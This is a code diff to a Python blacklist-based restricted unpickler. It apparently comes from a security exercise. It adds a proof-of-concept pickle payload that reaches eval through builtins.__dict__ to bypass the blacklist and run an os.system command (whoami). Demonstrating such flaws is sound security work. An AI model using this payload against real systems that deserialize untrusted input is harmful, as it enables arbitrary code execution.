@@ -13,8 +13,7 @@ class RestrictedUnpickler(pickle.Unpickler):
         if module == "builtins" and name not in self.blacklist:
             return getattr(builtins, name)
         # Forbid everything else.
-        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
-                                     (module, name))
+        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %(module, name))
 
 
 class PickleSerializer():
@@ -27,6 +26,11 @@ class PickleSerializer():
                 raise TypeError("Can't load pickle from unicode string")
             file = io.BytesIO(data)
             return RestrictedUnpickler(file,
-                              encoding='ASCII', errors='strict').load()
+                encoding='ASCII', errors='strict').load()
         except Exception as e:
-            return {}
+            print(e) 
+
+if __name__ == "__main__":
+    payload = b"cbuiltins\ngetattr\n(cbuiltins\n__dict__\nS'get'\ntR(S'eval'\ntR(S'__import__('os').system('whoami')'\ntR."
+    myPickleEngine = PickleSerializer()
+    myPickleEngine.loads(payload)
